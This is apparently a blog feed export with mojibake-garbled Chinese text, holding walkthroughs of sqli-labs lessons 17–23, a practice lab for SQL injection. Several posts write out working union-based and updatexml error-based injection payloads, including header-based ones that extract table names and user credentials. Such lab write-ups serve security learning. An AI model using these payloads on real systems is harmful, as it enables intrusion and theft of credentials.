    <content type="html"><![CDATA[<h2 id="lesson23ï¼š"><a href="#lesson23ï¼š" class="headerlink" title="lesson23ï¼š"></a>lesson23ï¼š</h2><p>è¿™å…³åˆå˜å›äº†getè¯·æ±‚ç±»å‹ã€‚</p><p>åœ¨urlè¡Œè¾“å…¥ï¼š?id=1, å‘ç°æœ‰å›æ˜¾ã€‚</p><p>è¾“å…¥ï¼š?id=1â€™ï¼ŒæŠ¥sqlè¯­æ³•é”™è¯¯ï¼›</p><p>è¾“å…¥ï¼š?id=1â€™ or â€˜1â€™=â€™1 ï¼Œç™»å…¥æˆåŠŸï¼›</p><p>è¾“å…¥ï¼š?id=1â€™ and â€˜1â€™=â€™2 ï¼Œç™»å…¥å¤±è´¥ã€‚å› æ­¤ç¡®å®šä¸ºå•å¼•å·ç±»å‹æ³¨å…¥ã€‚</p><p>å› ä¸ºæœ‰å›æ˜¾ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä½¿ç”¨è”åˆæ³¨å…¥å°±å¯ä»¥äº†ï¼Œè¯¦æƒ…å‚è€ƒlesson1ï¼Œä¸å†èµ˜è¿°ã€‚</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹å€¼å¾—æ³¨æ„ï¼Œå°±æ˜¯æˆ‘åœ¨æ„é€ payloadè¯­å¥æ—¶ï¼Œæˆ‘å‘ç°æˆ‘è‹¥ä»¥  <code>&#39;--+&#39;</code>   æˆ–è€… <code>#</code>  ç»“å°¾åˆ™é¡µé¢è¿”å›sqlè¯­æ³•é”™è¯¯ï¼Œäºæ˜¯æˆ‘æŸ¥çœ‹æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = &quot;/<span class="comment">#/&quot;;</span></span><br><span class="line">$reg1 = &quot;/<span class="comment">--/&quot;;</span></span><br><span class="line">$<span class="keyword">replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$id = preg_replace($reg, $<span class="keyword">replace</span>, $<span class="keyword">id</span>);</span><br><span class="line">$id = preg_replace($reg1, $<span class="keyword">replace</span>, $<span class="keyword">id</span>);</span><br></pre></td></tr></table></figure><p><strong>ä»‹ç»ä¸€ä¸‹preg_replace()å‡½æ•°ï¼š</strong></p><p><img src="/lesson23/1.png" alt="1"></p><p>å› æ­¤æˆ‘ä»¬å¾—çŸ¥  <code>&#39;--+&#39;</code>   å’Œ <code>#</code>  éƒ½è¢«å±è”½æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆé—­åˆsqlè¯­å¥å‘¢ï¼Ÿ</p><h5 id="1-unionæ³¨å…¥æ—¶"><a href="#1-unionæ³¨å…¥æ—¶" class="headerlink" title="1.unionæ³¨å…¥æ—¶"></a>1.unionæ³¨å…¥æ—¶</h5><p>ä»¥çˆ†åº“ä¸ºä¾‹ï¼š?id=-1â€™  union select 1,database(),â€™3   </p><p>â€‹               æˆ–ï¼š?id=-1â€™  union select 1,database(),3 or â€˜1â€™=â€™ </p><h5 id="2-æŠ¥é”™æ³¨å…¥æ—¶"><a href="#2-æŠ¥é”™æ³¨å…¥æ—¶" class="headerlink" title="2.æŠ¥é”™æ³¨å…¥æ—¶"></a>2.æŠ¥é”™æ³¨å…¥æ—¶</h5><p>ä»¥çˆ†åº“ä¸ºä¾‹ï¼š?id=-1â€™ and updatexml(1,concat(0x7e,(select database()),0x7e),1) or â€˜1â€™=â€™     </p><p>â€‹              </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;lesson23ï¼š&quot;&gt;&lt;a href=&quot;#lesson23ï¼š&quot; class=&quot;headerlink&quot; title=&quot;lesson23ï¼š&quot;&gt;&lt;/a&gt;lesson23ï¼š&lt;/h2&gt;&lt;p&gt;è¿™å…³åˆå˜å›äº†getè¯·æ±‚ç±»å‹ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨urlè¡Œè¾“å…¥ï¼š?id=1, å‘ç°æœ‰å›æ˜¾</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson21-22</title>
    <link href="http://example.com/2021/02/03/lesson21-22/"/>
    <id>http://example.com/2021/02/03/lesson21-22/</id>
    <published>2021-02-03T03:45:46.000Z</published>
    <updated>2021-02-03T10:43:31.553Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™å…³è™½ç„¶å’Œlesson18å¾ˆåƒï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šä¸œè¥¿å€¼å¾—å¼€ä¸€ç¯‡æ–°çš„blogã€‚</p><h2 id="lesson21ï¼š"><a href="#lesson21ï¼š" class="headerlink" title="lesson21ï¼š"></a>lesson21ï¼š</h2><p>é¦–å…ˆè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åï¼Œå¯†ç ï¼Œç”¨burpæŠ“åŒ…ï¼š</p><p><img src="/lesson21/1.png" alt="1"></p><p>æˆ‘ä»¬çœ‹åˆ°cookieä¸€è¡Œçš„uname=è¢«åŠ å¯†äº†ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600);</span><br></pre></td></tr></table></figure><p><strong>spï¼šä»‹ç»ä¸€ä¸‹setcookieï¼ˆï¼‰å‡½æ•°ï¼š</strong></p><p>setcookie() å‡½æ•°å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª HTTP cookieã€‚</p><p>cookie æ˜¯ç”±æœåŠ¡å™¨å‘é€åˆ°æµè§ˆå™¨çš„å˜é‡ã€‚cookie é€šå¸¸æ˜¯æœåŠ¡å™¨åµŒå…¥åˆ°ç”¨æˆ·è®¡ç®—æœºä¸­çš„å°æ–‡æœ¬æ–‡ä»¶ã€‚æ¯å½“åŒä¸€å°è®¡ç®—æœºé€šè¿‡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶ï¼Œå°±ä¼šå‘é€è¿™ä¸ª cookieã€‚</p><p>cookie çš„åç§°è‡ªåŠ¨æŒ‡å®šä¸ºç›¸åŒåç§°çš„å˜é‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¢«å‘é€çš„ cookie åä¸º â€œuserâ€ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåä¸º $user çš„å˜é‡ï¼ŒåŒ…å« cookie çš„å€¼ã€‚</p><p>å¿…é¡»åœ¨ä»»ä½•å…¶ä»–è¾“å‡ºå‘é€åˆ°å®¢æˆ·ç«¯å‰å¯¹ cookie è¿›è¡Œèµ‹å€¼ã€‚</p><p>å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å› TRUEã€‚å¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚</p><p><img src="/lesson21/2.png" alt="2"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°cookieçš„å€¼è¢«åŠ å¯†äº†ã€‚æ¥ç€çœ‹æºç ï¼š</p><p><img src="/lesson21/3.png" alt="3"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿¡è¿˜æ˜¯ä»cookieè¿›è¡Œæ³¨å…¥ï¼Œä¸è¿‡è¦å°†payloadè¿›è¡Œbase64åŠ å¯†ã€‚</p><p>åœ¨çº¿ç¼–è¯‘ç½‘ç«™ï¼š<a href="https://tool.oschina.net/encrypt?type=3">https://tool.oschina.net/encrypt?type=3</a></p><p>é‚£ä¹ˆå¼€å§‹æ³¨å…¥å§ï¼</p><p>æ³•1ï¼šæŠ¥é”™æ³¨å…¥ï¼Œç±»ä¼¼äºlesson18ï¼Œä¸è¿‡å¤šèµ˜è¿°äº†ï¼Œæ„é€ payloadç„¶ååœ¨ç½‘ç«™ä¸ŠåŠ å¯†ï¼Œå†æ·»åŠ åˆ°cookieä¸Šã€‚</p><p>æ³•2ï¼šunionè”åˆæ³¨å…¥ï¼Œå› ä¸ºå½“æˆ‘ä»¬è¾“å…¥æ­£ç¡®çš„è´¦å·å¯†ç çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¡µé¢æœ‰å›æ˜¾ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡order byå‡½æ•°æ¥æŸ¥å­—èŠ‚ã€‚å‰©ä¸‹çš„å°±æ˜¯ä»¥å‰å­¦çš„å†…å®¹äº†ï¼Œä¸å†èµ˜è¿°ã€‚</p><h2 id="lesson22ï¼š"><a href="#lesson22ï¼š" class="headerlink" title="lesson22ï¼š"></a>lesson22ï¼š</h2><p>è¿™ä¸€å…³å’Œlesson21å·®ä¸å¤šï¼Œå°±æ˜¯æ³¨å…¥ç±»å‹å˜æˆäº†åŒå¼•å·ï¼Œå…¶ä½™ä¸€è‡´ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™å…³è™½ç„¶å’Œlesson18å¾ˆåƒï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šä¸œè¥¿å€¼å¾—å¼€ä¸€ç¯‡æ–°çš„blogã€‚&lt;/p&gt;
&lt;h2 id=&quot;lesson21ï¼š&quot;&gt;&lt;a href=&quot;#lesson21ï¼š&quot; class=&quot;headerlink&quot; title=&quot;lesson21ï¼š&quot;&gt;&lt;/a&gt;lesson21ï¼š&lt;/h2&gt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>HTTPåè®®</title>
    <link href="http://example.com/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2021/02/02/HTTP%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-02-02T14:56:16.000Z</published>
    <updated>2021-04-15T12:31:34.645Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/HPPT%E5%8D%8F%E8%AE%AE/1.png" alt="1"></p><p><img src="/HPPT%E5%8D%8F%E8%AE%AE/2.png" alt="2"></p><p><img src="/HPPT%E5%8D%8F%E8%AE%AE/3.png" alt="3"></p><p><img src="/HPPT%E5%8D%8F%E8%AE%AE/4.png" alt="4"></p><p><img src="/HPPT%E5%8D%8F%E8%AE%AE/5.png" alt="5"></p><p><img src="/HPPT%E5%8D%8F%E8%AE%AE/6.png" alt="6"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/HPPT%E5%8D%8F%E8%AE%AE/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/HPPT%E5%8D%8F%E8%AE%AE/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/HPPT%E5%8D%8</summary>
      
    
    
    
    
    <category term="HTTP" scheme="http://example.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>lesson18-20</title>
    <link href="http://example.com/2021/02/01/lesson18-20/"/>
    <id>http://example.com/2021/02/01/lesson18-20/</id>
    <published>2021-02-01T12:33:49.000Z</published>
    <updated>2021-02-03T05:12:25.102Z</updated>
    
    <content type="html"><![CDATA[<h3 id="lesson18ï¼š"><a href="#lesson18ï¼š" class="headerlink" title="lesson18ï¼š"></a>lesson18ï¼š</h3><p>è¿™ä¸€é¢˜çœ‹è¿‡å»å’Œlesson17æ²¡ä»€ä¹ˆå·®åˆ«ï¼Œå°±å¤šäº†ä¸€è¡Œidåœ°å€ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]);</span><br><span class="line">$passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br></pre></td></tr></table></figure><p>å¯çŸ¥ï¼Œæ•°æ®åº“å¯¹è¾“å…¥çš„usernameå’Œpasswordéƒ½åšäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³é€šè¿‡é¡µé¢è¾“å…¥è·å–æ•°æ®åº“ä¿¡æ¯çš„æ–¹æ³•è‚¯å®šæ˜¯èµ°ä¸é€šäº†ã€‚æˆ‘ä»¬å†çœ‹æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure><p>æºç ä½¿ç”¨HTTP_USER_AGENTåªè·å–äº†HTTPè¯·æ±‚å¤´çš„ä¸€ä¸ªéƒ¨åˆ†: User-Agent ã€‚<br>è€Œè·å–IPåˆ™ä½¿ç”¨äº†RENOTE_ADDRï¼Œè¿™èƒ½ç›´æ¥è·å–TCPåè®®æ•°æ®åŒ…çš„åº•å±‚ä¼šè¯IPåœ°å€ï¼Œå®ƒèƒ½è¢«ä»£ç†æœåŠ¡å™¨æˆ–è·¯ç”±ä¿®æ”¹ä¼ªé€ ï¼Œä½†ä¿®æ”¹XFFå¤´å°±å¯ä»¥æ›´æ”¹çš„ã€‚æˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„uagentç­‰ä¼šè¢«å¸¦å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¥½åƒå¯ä»¥é€šè¿‡å¯¹uagentè¿›è¡Œæ”¹å†™ï¼Œæ„é€ payloadã€‚</p><p>ç„¶åæˆ‘ä»¬ç°åœ¨åœ¨é¡µé¢è¾“å…¥æ­£ç¡®è´¦å·å¯†ç åï¼Œå‘ç°é¡µé¢å›æ˜¾ï¼š<img src="/lesson18-19/1.png" alt="1"></p><p>é‚£ä¹ˆæˆ‘ä»¬æ›´å¯ä»¥ç¡®å®šæ˜¯å¯¹User-Agent ä¸‹æ‰‹ã€‚</p><p>é€šè¿‡ç¬¬ä¸‰æ®µæºç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ³¨å…¥ç±»å‹ä¸ºï¼šâ€™  ;</p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥å¼€å§‹ç”¨burp suiteæŠ“åŒ…ï¼š<img src="/lesson18-19/2.png" alt="2"></p><h5 id="payloadæ¨¡æ¿ï¼šâ€™-or-updatexml-1-concat-â€˜-â€™-clause-â€™-â€™-1-1-1"><a href="#payloadæ¨¡æ¿ï¼šâ€™-or-updatexml-1-concat-â€˜-â€™-clause-â€™-â€™-1-1-1" class="headerlink" title="payloadæ¨¡æ¿ï¼šâ€™ or updatexml(1,concat(â€˜#â€™,(clause),â€™#â€™),1),1,1)#"></a>payloadæ¨¡æ¿ï¼šâ€™ or updatexml(1,concat(â€˜#â€™,(clause),â€™#â€™),1),1,1)#</h5><p>å…¶ä¸­claseä¸ºæƒ³è¦æŸ¥è¯¢çš„å­å¥ï¼›æºç çš„insertè¯­å¥ä¸­åŸæœ¬æœ‰ä¸‰ä¸ªå‚æ•°ï¼ˆç”¨ä¸‰ä¸ª1è¡¨ç¤ºï¼‰â€”â€”ï¼ˆ1ï¼Œ1*ï¼Œ1**ï¼‰ï¼Œç„¶å1è¢«<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>  æ›¿æ¢ï¼Œåé¢1*å’Œ1**æ˜¯ä¸ºäº†å’Œinsertè¯­å¥ä¸­å‚æ•°æ•°é‡ä¸€è‡´ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š<img src="/lesson18-19/7.png" alt="7"></p><p>å½“updatexmlå‡½æ•°æŠ¥é”™ä»¥åï¼Œæ•°æ®åº“å°±ä¸ä¼šå»æ£€æŸ¥1*å’Œ1**äº†ã€‚</p><p>æ³¨ï¼š<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>å¸¦å…¥åˆ°æºç ä¸­ <code>&#39;&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1)</code>ï¼Œç¬¬ä¸€å¤„åˆå¹¶æ˜¯ç©ºï¼Œæ‰€ä»¥uagentæŠŠupdatexmlå‡½æ•°çš„å€¼å¸¦å…¥æ•°æ®åº“ã€‚</p><h4 id="çˆ†åº“ï¼š"><a href="#çˆ†åº“ï¼š" class="headerlink" title="çˆ†åº“ï¼š"></a>çˆ†åº“ï¼š</h4><p>ç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select database()),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forwordï¼Œå¾—ï¼š<img src="/lesson18-19/3.png" alt="3"></p><h4 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h4><p>ç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forwordï¼Œå¾—ï¼š<img src="/lesson18-19/4.png" alt="4"></p><p>æ³¨ï¼šå› ä¸ºæˆ‘ä¹‹å‰åœ¨securityæ•°æ®åº“é‡Œåˆ›äº†è¡¨ï¼Œç°åœ¨å¯¼è‡´è¡¨å¤ªå¤šäº†ï¼Œè€ŒæŠ¥é”™çš„é•¿åº¦æœ‰é™ï¼Œä¸èƒ½æŸ¥åˆ°æ‰€æœ‰è¡¨ã€‚ç„¶åæˆ‘æƒ³ç”¨limitå‡½æ•°é™åˆ¶æŸ¥è¯¢æ•°é‡ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†å¥½ä¹…æ²¡æœ‰æˆåŠŸï¼Œå…ˆç•™ä¸ªå‘å§ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p><h4 id="çˆ†åˆ—ï¼š"><a href="#çˆ†åˆ—ï¼š" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h4><p>ç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forwordï¼Œå¾—ï¼š</p><p><img src="/lesson18-19/5.png" alt="5"></p><h4 id="çˆ†å€¼ï¼š"><a href="#çˆ†å€¼ï¼š" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h4><p>ç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x),&#x27;<span class="comment">#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>Forwordï¼Œå¾—ï¼š</p><p><img src="/lesson18-19/6.png" alt="6"></p><h3 id="lesson19ï¼š"><a href="#lesson19ï¼š" class="headerlink" title="lesson19ï¼š"></a>lesson19ï¼š</h3><p>è¿™ä¸€å…³å’Œlesson18å·®ä¸å¤šï¼Œåªä¸è¿‡æ”¹åœ¨Refererå¤„å†™payloadã€‚</p><h3 id="lesson20ï¼š"><a href="#lesson20ï¼š" class="headerlink" title="lesson20ï¼š"></a>lesson20ï¼š</h3><p>è¿™ä¸€å…³å’Œlesson18ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸è¿‡åœ¨cookieå¤„å†™payloadï¼Œè€Œä¸”å› ä¸ºå½“è¾“å…¥æ­£ç¡®è´¦å·å¯†ç çš„æ—¶å€™ï¼Œç½‘é¡µä¼šå›æ˜¾ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é‡‡ç”¨unionè”åˆæ³¨å…¥ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;lesson18ï¼š&quot;&gt;&lt;a href=&quot;#lesson18ï¼š&quot; class=&quot;headerlink&quot; title=&quot;lesson18ï¼š&quot;&gt;&lt;/a&gt;lesson18ï¼š&lt;/h3&gt;&lt;p&gt;è¿™ä¸€é¢˜çœ‹è¿‡å»å’Œlesson17æ²¡ä»€ä¹ˆå·®åˆ«ï¼Œå°±å¤šäº†ä¸€è¡Œidåœ°å€ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç ï¼š&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson17</title>
    <link href="http://example.com/2021/01/31/lesson17/"/>
    <id>http://example.com/2021/01/31/lesson17/</id>
    <published>2021-01-31T13:26:30.000Z</published>
    <updated>2021-02-09T09:56:05.957Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lesson17ï¼š"><a href="#lesson17ï¼š" class="headerlink" title="lesson17ï¼š"></a>lesson17ï¼š</h1><p>è¿™ä¸€å…³ä¸ç®¡æˆ‘ä»¬åœ¨usernameä¸Šæ„é€ ä»€ä¹ˆpayloadéƒ½æ— æ³•ç¯¡æ”¹æ•°æ®åº“ã€‚</p><p>æˆ‘ä»¬æŸ¥çœ‹æºç ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value))</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,15);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å…ˆè®¤è¯†ä¸€ä¸‹é™Œç”Ÿå‡½æ•°ï¼š"><a href="#å…ˆè®¤è¯†ä¸€ä¸‹é™Œç”Ÿå‡½æ•°ï¼š" class="headerlink" title="å…ˆè®¤è¯†ä¸€ä¸‹é™Œç”Ÿå‡½æ•°ï¼š"></a>å…ˆè®¤è¯†ä¸€ä¸‹é™Œç”Ÿå‡½æ•°ï¼š</h4><h5 id="1-get-magic-quotes-gpc-å‡½æ•°"><a href="#1-get-magic-quotes-gpc-å‡½æ•°" class="headerlink" title="1.get_magic_quotes_gpc()å‡½æ•°"></a>1.get_magic_quotes_gpc()å‡½æ•°</h5><p>get_magic_quotes_gpc()å‡½æ•°å–å¾—PHPç¯å¢ƒé…ç½®çš„å˜é‡magic_quotes_gpc(GPC, Get/Post/Cookie)å€¼ã€‚è¿”å›0è¡¨ç¤ºæœ¬åŠŸèƒ½å…³é—­ï¼Œè¿”å›1è¡¨ç¤ºæœ¬åŠŸèƒ½æ‰“å¼€ã€‚</p><p>æ³¨ï¼šå¼€å¯magic_quotes_gpc=onä¹‹åï¼Œèƒ½å®ç°addsIshes()å’Œstripslashes()è¿™ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚åœ¨PHP4.0åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œè¯¥é€‰é¡¹é»˜è®¤æƒ…å†µä¸‹æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥åœ¨PHP4.0åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œå°±ç®—PHPç¨‹åºä¸­çš„å‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼ŒPHPç³»ç»Ÿä¹Ÿä¼šå¯¹æ¯ä¸€ä¸ªé€šè¿‡GETã€POSTã€COOKIEæ–¹å¼ä¼ é€’çš„å˜é‡è‡ªåŠ¨è½¬æ¢ï¼Œæ¢å¥è¯è¯´ï¼Œè¾“å…¥çš„æ³¨å…¥æ”»å‡»ä»£ç å°†ä¼šå…¨éƒ¨è¢«è½¬æ¢ï¼Œå°†ç»™æ”»å‡»è€…å¸¦æ¥éå¸¸å¤§çš„å›°éš¾ã€‚</p><h5 id="2-addslashes-å‡½æ•°"><a href="#2-addslashes-å‡½æ•°" class="headerlink" title="2.addslashes()å‡½æ•°"></a>2.addslashes()å‡½æ•°</h5><p>addslashes()å‡½æ•°å°†è¾“å…¥æ•°æ®ä¸­çš„é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’ŒNULL(ç©ºå­—ç¬¦)ï¼‰ä¹‹å‰æ·»åŠ åæ–œæ \çš„å­—ç¬¦ä¸²ã€‚</p><h5 id="3-stripslashes-å‡½æ•°"><a href="#3-stripslashes-å‡½æ•°" class="headerlink" title="3.stripslashes()å‡½æ•°"></a>3.stripslashes()å‡½æ•°</h5><p>stripslashes(string)å‡½æ•°åˆ é™¤ç”±addslashes()å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚</p><p>æ³¨æ„ï¼šå½“magic_quotes_gpcæ‰“å¼€æ—¶ï¼Œæ‰€æœ‰çš„å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’ŒNULL(ç©ºå­—ç¬¦)ä¼šè‡ªåŠ¨è½¬ä¸ºå«æœ‰åæ–œæ çš„æº¢å‡ºå­—ç¬¦ï¼ˆPHPå¯¹æ‰€æœ‰çš„GETã€POSTå’ŒCOOKIEæ•°æ®è‡ªåŠ¨è¿è¡Œaddslashes()ï¼‰ã€‚æ‰€ä»¥ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨addslashes()ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰ã€‚é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ä»¥ä½¿ç”¨å‡½æ•°get_magic_quotes_gpc()è¿›è¡Œæ£€æµ‹ã€‚</p><h5 id="4-ctype-digit-å‡½æ•°"><a href="#4-ctype-digit-å‡½æ•°" class="headerlink" title="4.ctype_digit()å‡½æ•°"></a>4.ctype_digit()å‡½æ•°</h5><p>ctype_digit()å‡½æ•°æ£€æŸ¥å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦æ˜¯å¦éƒ½æ˜¯åè¿›åˆ¶æ•°å­—ï¼Œè‹¥æ˜¯åˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚</p><h5 id="5-mysql-real-escape-string-å‡½æ•°"><a href="#5-mysql-real-escape-string-å‡½æ•°" class="headerlink" 